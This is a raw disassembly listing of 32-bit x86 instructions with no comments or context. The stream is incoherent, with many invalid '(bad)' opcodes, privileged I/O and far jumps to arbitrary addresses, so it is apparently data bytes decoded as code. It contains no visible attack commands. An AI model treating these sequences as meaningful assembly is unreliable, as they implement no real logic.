  424652:	pop    edx
  424653:	adc    al,0x34
  424655:	shr    BYTE PTR [eax+0x6d],1
  424658:	add    cl,cl
  42465a:	(bad)  
  42465b:	out    0xce,al
  42465d:	out    0x15,al
  42465f:	pop    ss
  424660:	iret   
  424661:	xchg   ecx,eax
  424662:	jp     0x4246b5
  424664:	mov    ebp,0x8e61cf82
  424669:	or     ah,BYTE PTR [esi+0x84beb73]
  42466f:	fiadd  WORD PTR [ecx+0x6c]
  424672:	sub    ebp,ecx
  424674:	mov    ebx,0xdaf41659
  424679:	xor    al,0xcf
  42467b:	cmp    esp,esi
  42467d:	adc    esp,edx
  42467f:	outs   dx,DWORD PTR ds:[esi]
  424680:	(bad)  
  424681:	push   edx
  424682:	sbb    ebp,eax
  424684:	add    DWORD PTR [esi+0x35],ecx
  424687:	mov    ebp,0xbcc1e5c0
  42468c:	jmp    FWORD PTR [eax+0x6]
  42468f:	or     BYTE PTR ds:0x5508afd0,dh
  424695:	(bad)  
  424696:	sti    
  424697:	mov    ebx,0xc79e66ba
  42469c:	pop    edi
  42469d:	cmp    dh,al
  42469f:	mov    al,ds:0xbc7656ca
  4246a4:	(bad)  
  4246a6:	push   esp
  4246a7:	nop
  4246a8:	daa    
  4246a9:	push   ebx
  4246aa:	(bad)  
  4246ab:	pop    ds
  4246ac:	cs out dx,eax
  4246ae:	cmc    
  4246af:	test   BYTE PTR [ecx+0x16],0xf6
  4246b3:	mov    esi,DWORD PTR [eax+0x53]
  4246b6:	sub    BYTE PTR [ecx+0x6e70699a],cl
  4246bc:	int    0xe
  4246be:	adc    DWORD PTR [ecx+0x2116e4c5],eax
  4246c4:	cmp    BYTE PTR [eax],bh
  4246c6:	pop    es
  4246c7:	mov    edx,0xd7e5c7d3
  4246cc:	xchg   ecx,eax
  4246cd:	and    ah,BYTE PTR [ebx+ecx*4+0x653b068b]
  4246d4:	add    BYTE PTR [esp+ebp*8-0x53],dl
  4246d8:	xor    esi,DWORD PTR [eax-0x3d]
  4246db:	in     al,0x7a
  4246dd:	call   0xa63c:0x5739018b
  4246e4:	call   0x6161d284
  4246e9:	inc    esp
  4246ea:	jo     0x4246d8
  4246ec:	xchg   ebp,eax
  4246ed:	xchg   esi,ecx
  4246ef:	jle    0x42470d
  4246f1:	aad    0xc4
  4246f3:	ja     0x424740
  4246f5:	lods   eax,DWORD PTR ds:[esi]
  4246f6:	sbb    ebp,DWORD PTR [edx+eax*4+0x164cfdd]
  4246fd:	mov    DWORD PTR [eax],ebx
  4246ff:	and    DWORD PTR [ecx],ecx
  424701:	int    0x98
  424703:	sbb    esp,ebx
  424705:	(bad)  
  424706:	sti    
  424707:	pop    ds
  424708:	stos   DWORD PTR es:[edi],eax
  424709:	jne    0x4246ba
  42470b:	aad    0x4c
  42470d:	hlt    
  42470e:	xchg   esp,eax
  42470f:	jp     0x424766
  424711:	out    0x7e,al
  424713:	das    
  424714:	adc    al,0xe2
  424716:	adc    dh,ah
  424718:	test   cl,dl
  42471a:	sbb    al,0x99
  42471c:	mov    ch,0x7f
  42471e:	jnp    0x4246bb
  424720:	test   DWORD PTR [ebx+0x2c],esp
  424723:	xor    ch,BYTE PTR [ebp+0x51]
  424726:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424727:	cli    
  424728:	and    DWORD PTR [eax],ebp
  42472a:	cmp    ecx,0xdf3d4efd
  424730:	sahf   
  424731:	jle    0x424712
  424733:	jne    0x424704
  424735:	sub    eax,0xc94eff4e
  42473a:	fstp   QWORD PTR [ecx+0x10f6170b]
  424740:	jle    0x424719
  424742:	xor    bh,bl
  424744:	(bad)  [ebp+0x111ec195]
  42474a:	out    dx,al
  42474b:	pop    edi
  42474c:	int    0xe6
  42474e:	mov    bh,0x4e
  424750:	ret    
  424751:	xchg   ecx,eax
  424752:	adc    eax,0x1a20f43e
  424757:	or     cl,BYTE PTR [esi+0x3dba2aa]
  42475d:	out    dx,al
  42475e:	xchg   BYTE PTR [edx+0x37],dh
  424761:	dec    ecx
  424762:	inc    ebp
  424763:	pop    ds
  424764:	ret    0xb6de
  424767:	(bad)  
  424768:	enter  0x3654,0x6a
  42476c:	inc    edx
  42476d:	call   DWORD PTR [ebp+0x761cf070]
  424773:	dec    edx
  424774:	and    al,0x22
  424776:	pop    ss
  424777:	arpl   WORD PTR [ebx],cx
  424779:	mov    ch,0x55
  42477b:	or     BYTE PTR cs:[ecx+0x58f58830],ah
  424782:	push   0x46
  424784:	stos   BYTE PTR es:[edi],al
  424785:	test   eax,0x3769a107
  42478a:	push   ebp
  42478b:	push   0x2e1f21d8
  424790:	sbb    ebp,edx
  424792:	repz jne 0x424778
  424795:	imul   DWORD PTR [edx+0x61]
  424798:	pop    ebx
  424799:	addr16 push ds
  42479b:	lea    esp,[ebp-0x5c]
  42479e:	mov    BYTE PTR ds:0xdf03f35c,dh
  4247a4:	leave  
  4247a5:	push   0x1
  4247a7:	mov    cl,0xe7
  4247a9:	ins    DWORD PTR es:[edi],dx
  4247aa:	mov    al,0x5d
  4247ac:	test   al,0xfc
  4247ae:	shl    DWORD PTR [ebx+0xf],0xcb
  4247b2:	rcl    DWORD PTR [ebx],1
  4247b4:	out    0x65,al
  4247b6:	mov    ecx,0x86a54596
  4247bb:	add    esi,esi
  4247bd:	in     eax,0xf3
  4247bf:	test   BYTE PTR [ebp+0x710506ab],ah
  4247c5:	xchg   DWORD PTR [ecx+0x59],ebx
  4247c8:	mov    al,0x98
  4247ca:	jne    0x4247fa
  4247cc:	xchg   edi,eax
  4247cd:	push   edi
  4247ce:	push   edi
  4247cf:	cmp    DWORD PTR [ecx+esi*1-0x736277a4],eax
  4247d6:	stos   BYTE PTR es:[edi],al
  4247d7:	pushf  
  4247d8:	jge    0x4247a2
  4247da:	test   al,0x70
  4247dc:	sar    al,1
  4247de:	push   si
  4247e0:	mov    edi,0x8d7a68d9
  4247e5:	xchg   ebx,eax
  4247e6:	xor    BYTE PTR [esi+0x7bcbfe44],bl
  4247ec:	dec    eax
  4247ed:	and    al,0x2e
  4247ef:	shl    BYTE PTR [ebp-0x4cbde28d],1
  4247f5:	add    DWORD PTR [ebp-0x5d954277],ebp
  4247fb:	dec    eax
  4247fc:	jnp    0x424794
  4247fe:	adc    esp,eax
  424800:	and    al,0xec
  424802:	adc    cl,BYTE PTR [esi+0x7c]
  424805:	sbb    eax,0xef5627e
  42480a:	test   ch,dh
  42480c:	sbb    al,0x30
  42480e:	popa   
  42480f:	mov    WORD PTR [ebx+0x52],ss
  424812:	std    
  424813:	dec    edi
  424814:	out    dx,al
  424815:	sub    al,0x78
  424817:	dec    ebp
  424818:	cmp    BYTE PTR [ebx+esi*1],al
  42481b:	aam    0xd6
  42481d:	cmp    eax,0x3e960bc
  424822:	scas   eax,DWORD PTR es:[edi]
  424823:	adc    DWORD PTR [ecx],ecx
  424825:	xchg   DWORD PTR [ebp-0x32d616e9],edi
  42482b:	(bad)  
  42482c:	jns    0x424824
  42482e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42482f:	mov    eax,0x797de4b1
  424834:	call   0x6dce:0xd8ec2477
  42483b:	push   esp
  42483c:	push   cs
  42483d:	fs pop esi
  42483f:	fs push edi
  424841:	push   ecx
  424842:	mov    eax,ds:0x681998de
  424847:	pushf  
  424848:	xor    al,BYTE PTR [esi+0x50d8ba72]
  42484e:	dec    BYTE PTR [edi]
  424850:	lea    esi,[edi-0x4ac9b1d9]
  424856:	add    al,0xbf
  424858:	(bad)  
  424859:	jmp    0x424832
  42485b:	aaa    
  42485c:	inc    esp
  42485d:	test   al,0x74
  42485f:	xor    al,0x2e
  424861:	inc    ebp
  424862:	mov    ch,0x19
  424864:	sahf   
  424865:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424866:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424867:	add    ah,BYTE PTR [ecx]
  424869:	xor    al,0x58
  42486b:	test   eax,0x1ae322ee
  424870:	mov    bh,0xa7
  424872:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  424873:	lods   eax,DWORD PTR ds:[esi]
  424874:	jae    0x4248e5
  424876:	push   edi
  424877:	(bad)
  42487b:	pop    edx
  42487c:	dec    ebx
  42487d:	(bad)  
  42487f:	dec    ecx
  424880:	push   ebx
  424881:	dec    edx
  424882:	sub    ch,dl
  424884:	in     eax,0x10
  424886:	push   es
  424887:	push   0x5da2b75d
  42488c:	sub    edx,ebp
  42488e:	(bad)  
  424890:	pushf  
  424891:	ret    
  424892:	out    0x36,al
  424894:	xor    edi,DWORD PTR [edx+0x14]
  424897:	adc    al,0x9b
  424899:	push   ebp
  42489a:	mov    esp,0x41bafa6e
  42489f:	mov    dl,0xcd
  4248a1:	xchg   DWORD PTR [ebx-0xa21daff],ecx
  4248a7:	stos   DWORD PTR es:[edi],eax
  4248a8:	add    ebx,eax
  4248aa:	pop    eax
  4248ab:	fst    DWORD PTR [edx-0x7e]
  4248ae:	and    ax,0x6c19
  4248b2:	nop
  4248b3:	mov    ah,0x86
  4248b5:	das    
  4248b6:	push   cs
  4248b7:	push   esi
  4248b8:	cmp    dh,BYTE PTR [edi+0x2c]
  4248bb:	(bad)  
  4248bd:	mov    dh,0xea
  4248bf:	leave  
  4248c0:	mov    cl,0x6c
  4248c2:	mov    cs:0xa33259a,eax
  4248c8:	pop    esp
  4248c9:	add    eax,0x99321dac
  4248ce:	jmp    0x424927
  4248d0:	dec    esp
  4248d1:	cwde   
  4248d2:	(bad)  
  4248d3:	cld    
  4248d4:	dec    ebp
  4248d5:	push   es
  4248d6:	sub    ch,al
  4248d8:	and    eax,0x4249ea78
  4248dd:	test   eax,0x8d1475bc
  4248e2:	mov    cl,0xaa
  4248e4:	fist   WORD PTR [edi+eax*1+0x2d69e8c0]
  4248eb:	retf   
  4248ec:	pop    edi
  4248ed:	imul   BYTE PTR [ebx+0x5e]
  4248f0:	hlt    
  4248f1:	lock les ecx,FWORD PTR [eax+0x6ab0b392]
  4248f8:	jmp    0x6d082754
  4248fd:	into   
  4248fe:	(bad)  [ebp+0x3e46333a]
  424904:	pop    esi
  424905:	push   0xe31ff8fb
  42490a:	and    ah,BYTE PTR [edx+0x17]
  42490d:	xor    eax,0xf085dfcf
  424912:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424913:	add    ecx,DWORD PTR [ebx+0x51]
  424916:	jmp    0x8b23e3bb
  42491b:	add    al,0xc8
  42491d:	xchg   ebp,eax
  42491e:	enter  0xf2f1,0x4
  424922:	(bad)  
  424923:	pcmpgtb mm4,QWORD PTR [eax]
  424926:	sub    al,0xd8
  424928:	dec    edx
  424929:	add    DWORD PTR [eax],esi
  42492b:	bound  ecx,QWORD PTR [edx+edx*8]
  42492e:	pop    ebp
  42492f:	and    edi,esi
  424931:	ss xor al,0x9c
  424934:	jge    0x424983
  424936:	jno    0x4248d6
  424938:	dec    edx
  424939:	cmp    eax,0x5e61de4f
  42493e:	loopne 0x4248ce
  424940:	(bad)  
  424941:	fcmovnb st,st(1)
  424943:	sbb    cl,BYTE PTR [ebx+eax*1]
  424946:	jg     0x424974
  424948:	mov    DWORD PTR [ebx+esi*4-0x60bd42c5],ebp
  42494f:	jmp    0x4249c8
  424951:	push   ds
  424952:	jbe    0x424954
  424954:	push   edx
  424955:	scas   eax,DWORD PTR es:[edi]
  424956:	xchg   ebx,eax
  424957:	add    ch,BYTE PTR ds:0xb7e33962
  42495d:	and    eax,0xd53c2432
  424962:	or     DWORD PTR [ecx+0x4f25d2c1],edi
  424968:	xor    al,0xa3
  42496a:	add    BYTE PTR [edx-0x2fbc0759],dh
  424970:	add    eax,0x67f04ce3
  424975:	int3   
  424976:	cmp    BYTE PTR [esi+0x7e],cl
  424979:	ins    BYTE PTR es:[edi],dx
  42497a:	fmulp  st(5),st
  42497c:	cs mov ebx,0xa4b59c39
  424982:	mov    edx,0x41d39223
  424987:	pusha  
  424988:	repz xlat BYTE PTR ds:[ebx]
  42498a:	lods   eax,DWORD PTR ds:[esi]
  42498b:	and    dl,BYTE PTR [esi]
  42498d:	int3   
  42498e:	dec    ebp
  42498f:	pop    es
  424990:	fbstp  TBYTE PTR [ecx+0x21]
  424993:	xchg   edx,eax
  424994:	test   BYTE PTR [eax-0x2001e3eb],dl
  42499a:	xor    edx,DWORD PTR [ebx]
  42499c:	sub    BYTE PTR [eax+0x50],ch
  42499f:	shl    ch,1
  4249a1:	into   
  4249a2:	jns    0x424a1f
  4249a4:	jae    0x424a17
  4249a6:	stos   BYTE PTR es:[edi],al
  4249a7:	jns    0x424a02
  4249a9:	inc    ebp
  4249aa:	push   eax
  4249ab:	std    
  4249ac:	ret    0xfe64
  4249af:	arpl   WORD PTR [eax-0x5cdd083f],bp
  4249b5:	ret    0xd143
  4249b8:	neg    BYTE PTR [ebp+0x69]
  4249bb:	aas    
  4249bc:	xchg   ebp,eax
  4249bd:	xchg   esi,eax
  4249be:	sub    dl,BYTE PTR [ebp-0x6]
  4249c1:	pop    eax
  4249c2:	popf   
  4249c3:	xchg   edx,eax
  4249c4:	dec    ebx
  4249c5:	sar    BYTE PTR [edx-0x5c],cl
  4249c8:	addr16 inc ecx
  4249ca:	jmp    0xe88d:0x3884b818
  4249d1:	lock ja 0x424997
  4249d4:	push   eax
  4249d5:	sahf   
  4249d6:	into   
  4249d7:	pusha  
  4249d8:	xor    cl,BYTE PTR [eax+ebp*2]
  4249db:	jg     0x424a15
  4249dd:	xor    ch,dh
  4249df:	cmp    DWORD PTR [ecx-0x2a],0x1f6ab2d1
  4249e6:	xor    DWORD PTR [ebx],edi
  4249e8:	(bad)  
  4249e9:	fwait
  4249ea:	in     eax,dx
  4249eb:	or     BYTE PTR [eax],ch
  4249ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4249ee:	xor    al,0xa6
  4249f0:	pop    eax
  4249f1:	cdq    
  4249f2:	test   al,0x73
  4249f4:	pop    ecx
	...
  424a01:	push   ebp
  424a02:	push   0xffffffe6
  424a04:	mov    bl,0xff
  424a06:	mov    edi,0x7b2ee55
  424a0b:	cmp    BYTE PTR [eax],dh
  424a0d:	jmp    0x1c1:0xa111765a
  424a14:	add    BYTE PTR [ebx+eax*1+0x72700000],ch
  424a1b:	fisub  DWORD PTR [edi+0x276ae1cf]
  424a21:	std    
  424a22:	mov    dl,dl
  424a24:	test   BYTE PTR [ebp-0x4134a9c],ah
  424a2a:	xchg   esp,eax
  424a2b:	push   edx
  424a2c:	fld    QWORD PTR [esp+esi*1+0x4cfab9ae]
  424a33:	outs   dx,BYTE PTR ds:[esi]
  424a34:	pop    ds
  424a35:	mov    esi,0x488f39eb
  424a3a:	jp     0x424a50
  424a3c:	pop    es
  424a3d:	pavgw  mm6,mm7
  424a40:	mov    dh,0x52
  424a42:	out    0x5f,al
  424a44:	dec    esp
  424a45:	enter  0xa009,0xc6
  424a49:	inc    esi
  424a4a:	shl    DWORD PTR [ecx-0x2e6bbfb5],1
  424a50:	add    DWORD PTR [ecx],ecx
  424a52:	jp     0x424a9a
  424a54:	mov    ebp,0x3baa871c
  424a59:	dec    esi
  424a5a:	shr    BYTE PTR [ebp+ebp*8+0x46],0x6
  424a5f:	jg     0x424a1b
  424a61:	mov    WORD PTR [eax+0x21f16536],?
  424a67:	pop    ecx
  424a68:	inc    ecx
  424a69:	push   ecx
  424a6a:	in     eax,dx
  424a6b:	popa   
  424a6c:	mov    edi,0x9d1dfb11
  424a71:	xor    DWORD PTR [edi],edi
  424a73:	lods   al,BYTE PTR ds:[esi]
  424a74:	xchg   ecx,eax
  424a75:	pop    ebp
  424a76:	xchg   dh,ah
  424a78:	sbb    DWORD PTR [esi+0x5f],edx
  424a7b:	cmp    al,0x1c
  424a7d:	in     eax,0xff
  424a7f:	std    
  424a80:	jno    0x424a4a
  424a82:	xor    ebx,edi
  424a84:	(bad)  [edi+0x4c]
  424a87:	std    
  424a88:	xchg   ebp,eax
  424a89:	ret    
  424a8a:	out    dx,eax
  424a8b:	adc    al,0xc6
  424a8d:	pop    ecx
  424a8e:	rcl    esp,0xc0
  424a91:	push   ebp
  424a92:	lds    esp,FWORD PTR [eax-0x32d11332]
  424a98:	popa   
  424a99:	or     eax,0x4a097bb4
  424a9e:	cmp    BYTE PTR [edi-0x723ab78b],cl
  424aa4:	xor    eax,ebx
  424aa6:	fdivr  st(3),st
  424aa8:	and    dl,ch
  424aaa:	inc    ecx
  424aab:	xchg   esi,eax
  424aac:	mov    cl,ah
  424aae:	and    eax,0x85bb723b
  424ab3:	adc    ebp,ebp
  424ab5:	adc    al,0x10
  424ab7:	inc    ecx
  424ab8:	ret    0x24a5
  424abb:	cmp    al,ch
  424abd:	or     edi,DWORD PTR [ecx]
  424abf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424ac0:	inc    ecx
  424ac1:	push   edx
  424ac2:	sub    DWORD PTR [edi-0x70],edx
  424ac5:	leave  
  424ac6:	in     eax,dx
  424ac7:	mov    fs,edx
  424ac9:	lahf   
  424aca:	std    
  424acb:	sbb    DWORD PTR [ebp+0x9f5afb4],0x77
  424ad2:	cmp    al,0x46
  424ad4:	test   DWORD PTR [edi],ebx
  424ad6:	lods   al,BYTE PTR ds:[esi]
  424ad7:	push   cs
  424ad8:	xchg   edi,eax
  424ad9:	aaa    
  424ada:	out    0xc5,al
  424adc:	cwde   
  424add:	fisub  WORD PTR [esi]
  424adf:	loopne 0x424b50
  424ae1:	cmp    DWORD PTR [edi+0x6bb8c7e6],edx
  424ae7:	or     ah,dl
  424ae9:	pop    eax
  424aea:	(bad)  
  424aeb:	xchg   esi,eax
  424aec:	push   esi
  424aed:	shl    BYTE PTR [ebp+0x588c6ab8],cl
  424af3:	popa   
  424af4:	mov    ch,0x1b
  424af6:	clc    
  424af7:	sbb    DWORD PTR [esi-0x5b],eax
  424afa:	cs call 0xae221a6c
  424b00:	fisubr DWORD PTR [esi+0x23]
  424b03:	sahf   
  424b04:	outs   dx,BYTE PTR ds:[esi]
  424b05:	rcr    DWORD PTR [ecx-0x1aab8274],cl
  424b0b:	jne    0x424b45
  424b0d:	shl    DWORD PTR [edx],0xc5
  424b10:	stos   DWORD PTR es:[edi],eax
  424b11:	mov    bh,0xf4
  424b13:	jnp    0x424ade
  424b15:	mov    esp,ebp
  424b17:	and    esp,esp
  424b19:	or     eax,0x30688210
  424b1e:	rol    DWORD PTR [esi+ebp*1-0x7b],1
  424b22:	stc    
  424b23:	add    al,ah
  424b25:	popa   
  424b26:	or     al,0xb
  424b28:	cmp    eax,0x13d24990
  424b2d:	int3   
  424b2e:	and    ebp,DWORD PTR [edi-0x25ade86d]
  424b34:	add    eax,0x7e4a71d9
  424b39:	jne    0x424afb
  424b3b:	xchg   ecx,eax
  424b3c:	pop    esp
  424b3d:	mov    ?,WORD PTR [ebx+0x60]
  424b40:	or     BYTE PTR [ebp+eiz*8-0x2c],dl
  424b44:	jl     0x424b13
  424b46:	sbb    al,0x55
  424b48:	mov    DWORD PTR [ecx],ebx
  424b4a:	(bad)  
  424b4b:	pop    edi
  424b4c:	jo     0x424b97
  424b4e:	mov    cl,0xc4
  424b50:	jb     0x424b2a
  424b52:	gs icebp 
  424b54:	ds retf 
  424b56:	hlt    
  424b57:	shl    BYTE PTR [edx-0x27ab1f48],0xb5
  424b5e:	test   eax,0x18af00fb
  424b63:	(bad)  
  424b64:	loopne 0x424ba7
  424b66:	out    0xf3,eax
  424b68:	mov    eax,esi
  424b6a:	jnp    0x424b73
  424b6c:	cmp    esp,esp
  424b6e:	popa   
  424b6f:	jbe    0x424b8f
  424b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424b72:	cmc    
  424b73:	or     eax,0x286ef98d
  424b78:	push   esi
  424b79:	mov    dl,0xb0
  424b7b:	push   ds
  424b7c:	test   BYTE PTR [ebx-0x7dd118d8],0x75
  424b83:	adc    cl,BYTE PTR [ebx+0x15]
  424b86:	sbb    al,0xdf
  424b88:	cmp    ch,BYTE PTR [ebx*8+0x16fd88d5]
  424b8f:	leave  
  424b90:	jno    0x424b70
  424b92:	push   ebx
  424b93:	stc    
  424b94:	push   edx
  424b95:	in     eax,dx
  424b96:	call   0xf63b8a24
  424b9b:	adc    ecx,DWORD PTR [edi+0x559b3e96]
  424ba1:	icebp  
  424ba2:	pop    eax
  424ba3:	dec    esp
  424ba4:	(bad)  
  424ba5:	adc    BYTE PTR [ecx-0x33],bl
  424ba8:	xchg   esp,eax
  424ba9:	frstor [eax+0x67bdcd0]
  424baf:	mov    ecx,0x8b2a849e
  424bb4:	adc    DWORD PTR [ebp+0x4c60a802],ebx
  424bba:	cli    
  424bbb:	in     eax,dx
  424bbc:	jge    0x424bfd
  424bbe:	repnz (bad) {k4}
  424bc4:	sub    eax,0xd8bc4c43
  424bc9:	add    al,BYTE PTR [ebx]
  424bcb:	adc    cl,BYTE PTR [ecx-0x1e]
  424bce:	adc    dh,cl
  424bd0:	in     eax,0x52
  424bd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424bd3:	ret    0xc29c
  424bd6:	hlt    
  424bd7:	(bad)  
  424bd8:	lea    edx,[ebx]
  424bda:	bound  esi,QWORD PTR [eax+0x19007d64]
  424be0:	cmp    ebp,DWORD PTR [ebx-0x678b09f1]
  424be6:	mov    eax,ds:0x746c961
  424beb:	jmp    0x52992c47
  424bf0:	sti    
  424bf1:	or     BYTE PTR [ecx+0x58],ah
  424bf4:	push   ss
  424bf5:	push   es
  424bf6:	sub    ah,ah
  424bf8:	pop    ss
  424bf9:	lock xchg ebx,eax
  424bfb:	stc    
  424bfc:	pop    ecx
  424bfd:	lahf   
  424bfe:	shl    DWORD PTR [eax-0x74],0x28
  424c02:	ja     0x424c55
  424c04:	outs   dx,BYTE PTR ds:[esi]
  424c05:	push   esp
  424c06:	pop    edx
  424c07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424c08:	inc    edx
  424c09:	mov    ebx,0x1542b3a5
  424c0e:	pop    eax
  424c0f:	out    0xb,al
  424c11:	leave  
  424c12:	add    ecx,0xaaf4dccd
  424c18:	es jl  0x424bea
  424c1b:	dec    ecx
  424c1c:	mov    al,0xfd
  424c1e:	pusha  
  424c1f:	dec    edi
  424c20:	sub    dl,BYTE PTR [ecx]
  424c22:	das    
  424c23:	dec    BYTE PTR [edx]
  424c25:	shl    BYTE PTR [eax-0x7ac6ef14],1
  424c2b:	jg     0x424c8f
  424c2d:	test   eax,0x6a6dfaa
  424c32:	rcr    BYTE PTR [edx-0x19],cl
  424c35:	cmp    ecx,edx
  424c37:	test   al,0x58
  424c39:	jmp    0x5579ca8e
  424c3e:	les    ecx,FWORD PTR [edi]
  424c40:	dec    esp
  424c41:	mov    cl,0x74
  424c43:	push   ebp
  424c44:	push   0x849cbb2b
  424c49:	pushf  
  424c4a:	push   es
  424c4b:	jb     0x424c12
  424c4d:	aad    0x15
  424c4f:	mov    ch,0x9f
  424c51:	push   edi
  424c52:	xor    DWORD PTR [ebp-0x76],esp
  424c55:	xor    BYTE PTR [ecx+edi*2],cl
  424c58:	pushf  
  424c59:	es xchg ebp,eax
  424c5b:	hlt    
  424c5c:	stc    
  424c5d:	jmp    0x187ba8d8
  424c62:	jo     0x424c97
  424c64:	pop    ebp
  424c65:	ds sbb al,0x8e
  424c68:	sub    eax,0xb2eec9ee
  424c6d:	or     al,0x35
  424c6f:	dec    edx
  424c70:	fdiv   QWORD PTR [edi]
  424c72:	and    cl,dh
  424c74:	mov    ah,0xec
  424c76:	loop   0x424c65
  424c78:	xlat   BYTE PTR ds:[ebx]
  424c79:	cwde   
  424c7a:	es dec edx
  424c7c:	int3   
  424c7d:	sahf   
  424c7e:	mov    ds:0xb4482af,al
  424c83:	mov    ds:0x5285ab61,al
  424c88:	mov    al,ds:0x6fc3fc47
  424c8d:	xchg   esi,eax
  424c8e:	pop    edi
  424c8f:	xor    eax,0xe4ba3879
  424c94:	and    bh,ch
  424c96:	add    al,0x2a
  424c98:	sub    al,0x16
  424c9a:	push   0x5cd2b8b9
  424c9f:	push   esp
  424ca0:	std    
  424ca1:	jo     0x424cc8
  424ca3:	xchg   esp,eax
  424ca4:	lods   eax,DWORD PTR ds:[esi]
  424ca5:	mov    dl,0xa7
  424ca7:	jns    0x424c46
  424ca9:	push   0xaa52d2fe
  424cae:	repnz mov dl,0x6d
  424cb1:	mov    al,dh
  424cb3:	fwait
  424cb4:	jp     0x424d04
  424cb6:	fdiv   QWORD PTR [ebx]
  424cb8:	(bad)  
  424cb9:	lods   al,BYTE PTR ds:[esi]
  424cba:	dec    ebp
  424cbb:	mov    ch,0x4c
  424cbd:	mov    bh,0x69
  424cbf:	mov    al,ds:0x72207eca
  424cc4:	ucomiss xmm6,DWORD PTR [edx]
  424cc7:	mov    esp,0xc5d22aa2
  424ccc:	lods   al,BYTE PTR ds:[esi]
  424ccd:	jg     0x424d4a
  424ccf:	popa   
  424cd0:	add    ah,BYTE PTR [eax-0x52]
  424cd3:	mov    ah,0x83
  424cd5:	and    esi,ebp
  424cd7:	int3   
  424cd8:	rcr    DWORD PTR [eax-0x6ccaffe0],0x65
  424cdf:	xchg   ecx,eax
  424ce0:	mov    ebx,0x6c00e6c9
  424ce5:	imul   esp,DWORD PTR [eax],0xffffffed
  424ce8:	bound  edi,QWORD PTR [eax+ebp*2]
  424ceb:	push   esi
  424cec:	(bad)  
  424ced:	mov    esp,0xc67959e8
  424cf2:	cs loope 0x424c78
  424cf5:	push   esp
  424cf6:	test   DWORD PTR [ecx+0x70ec282],0x946909c2
  424d00:	outs   dx,DWORD PTR fs:[esi]
  424d02:	push   ebx
  424d03:	push   ds
  424d04:	adc    DWORD PTR [edi+0x1ec6b419],ebp
  424d0a:	stos   DWORD PTR es:[edi],eax
  424d0b:	sbb    DWORD PTR [ebp+0x18],ecx
  424d0e:	js     0x424d32
  424d10:	iret   
  424d11:	inc    edx
  424d12:	adc    eax,0xf1d4edbd
  424d17:	cld    
  424d18:	inc    eax
  424d19:	dec    ebx
  424d1a:	scas   eax,DWORD PTR es:[edi]
  424d1b:	jmp    0x424d41
  424d1d:	xchg   ebx,eax
  424d1e:	popa   
  424d1f:	addr16 stc 
  424d21:	scas   al,BYTE PTR es:[edi]
  424d22:	(bad)  
  424d23:	loope  0x424d29
  424d25:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424d26:	adc    bl,BYTE PTR [edi-0x4f839527]
  424d2c:	sbb    bh,BYTE PTR [ebp+0x3b]
  424d2f:	in     eax,dx
  424d30:	inc    esp
  424d31:	in     al,dx
  424d32:	mov    eax,ds:0x72436ca
  424d37:	das    
  424d38:	(bad)  
  424d39:	aad    0x5e
  424d3b:	ret    0xbea6
  424d3e:	out    dx,al
  424d3f:	and    BYTE PTR [esi],al
  424d41:	daa    
  424d42:	push   edi
  424d43:	outs   dx,BYTE PTR ds:[esi]
  424d44:	and    BYTE PTR [esi-0x44],ch
  424d47:	and    BYTE PTR [ecx+0x4c5c1032],bh
  424d4d:	adc    eax,0xcfe834d0
  424d52:	pop    esi
  424d53:	xchg   BYTE PTR [ecx+0x266c0348],dh
  424d59:	retf   
  424d5a:	or     dl,BYTE PTR [esi+0x59]
  424d5d:	mov    cl,0x77
  424d5f:	outs   dx,DWORD PTR ds:[esi]
  424d60:	adc    dh,ch
  424d62:	or     bl,BYTE PTR [edi]
  424d64:	mov    edx,0x196b39bf
  424d69:	sti    
  424d6a:	mov    edi,0x58b56850
  424d6f:	std    
  424d70:	cmp    ecx,ecx
  424d72:	and    DWORD PTR [edi],esi
  424d74:	je     0x424d30
  424d76:	lock int 0xb2
  424d79:	adc    eax,0x1da022f8
  424d7e:	mov    al,0x73
  424d80:	int    0x2c
  424d82:	lahf   
  424d83:	pop    es
  424d84:	addr16 dec edx
  424d86:	bswap  edi
  424d88:	xchg   ebp,eax
  424d89:	jne    0x424d90
  424d8b:	mov    bl,0xd2
  424d8d:	(bad)  
  424d8e:	mov    al,ds:0x7ca15db4
  424d93:	xor    al,0x1c
  424d95:	lahf   
  424d96:	push   ebx
  424d97:	ins    DWORD PTR es:[edi],dx
  424d98:	sbb    eax,0x3c4a5a5b
  424d9d:	(bad)  
  424d9e:	(bad)  
  424da0:	ficom  DWORD PTR [edi+0x6c7cee16]
  424da6:	sahf   
  424da7:	jp     0x424d7f
  424da9:	daa    
  424daa:	cli    
  424dab:	test   al,0x16
  424dad:	jno    0x424d70
  424daf:	in     eax,dx
  424db0:	out    0x86,al
  424db2:	jmp    0xfa88:0xcef43180
  424db9:	mov    ecx,0x71405a91
  424dbe:	jbe    0x424d52
  424dc0:	rcl    BYTE PTR [eax+0xf81ce5],1
	...
  424dce:	add    BYTE PTR [eax],al
  424dd0:	add    BYTE PTR [esi-0x42494e3],cl
  424dd6:	(bad)  
  424dd7:	mov    esi,0x726f765d
  424ddc:	xor    ch,bl
  424dde:	sar    BYTE PTR [ebx+0x1c54dfb],1
  424de4:	add    BYTE PTR [ebx+eax*1+0x25ab0000],ch
  424deb:	jmp    0x5c24:0x64f29d8
  424df2:	scas   al,BYTE PTR es:[edi]
  424df3:	stos   BYTE PTR es:[edi],al
  424df4:	mov    al,ds:0xbb8cec45
  424df9:	add    ah,BYTE PTR [edx+0x7c]
  424dfc:	xor    ebx,0x72
  424dff:	xor    BYTE PTR [ebx],bh
  424e01:	(bad)  
  424e02:	xchg   esi,eax
  424e03:	stc    
  424e04:	test   BYTE PTR [ebx-0x2db4cd30],dl
  424e0a:	fsub   st(1),st
  424e0c:	stos   DWORD PTR es:[edi],eax
  424e0d:	cld    
  424e0e:	inc    ebx
  424e0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
